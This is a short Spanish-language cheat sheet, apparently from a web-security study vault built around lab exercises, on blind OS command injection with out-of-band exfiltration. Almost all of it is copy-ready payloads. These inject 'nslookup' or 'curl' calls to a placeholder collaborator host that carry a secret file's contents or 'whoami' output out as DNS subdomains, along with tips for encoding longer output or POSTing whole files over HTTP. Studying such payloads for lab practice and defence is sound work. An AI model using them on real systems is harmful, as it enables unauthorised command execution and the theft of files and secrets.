# Inyección de comandos ciega — exfil por DNS (nslookup)

> Comando **inline** (`$(...)` o backticks) dentro de un `nslookup`: su salida viaja como **subdominio** hacia Collaborator. Cambiá `OASTIFY.com` por tu payload. Los `||...||` cortan el comando original a ambos lados. Solo salen chars válidos de DNS (sin espacios) y cada label ≤ 63 chars.

**Leer un secreto conocido**
```
||nslookup $(cat /home/carlos/secret).OASTIFY.com||
```

**Salida de un comando (whoami, id, etc.)**
```
||nslookup $(whoami).OASTIFY.com||
||nslookup `whoami`.OASTIFY.com||
```

**Con curl/wget (DNS + HTTP)**
```
||curl $(whoami).OASTIFY.com||
```

> [!note] Si la salida tiene espacios, `/` o es larga, encadená `base64`/`sed`/`cut` y decodificás vos. Para un archivo entero no alcanza el label DNS → POSTealo por HTTP. En Collaborator → *Poll now*, el botín aparece en el subdominio de la interacción DNS.

## 🔗 [[../../vulnerabilities/027-os-command-injection/os-command-injection|OS Command Injection]] · [[../../vulnerabilities/027-os-command-injection/examples/005-blind-oob-exfil|005 · exfil OOB por DNS]] · [[exfil-oastify]]
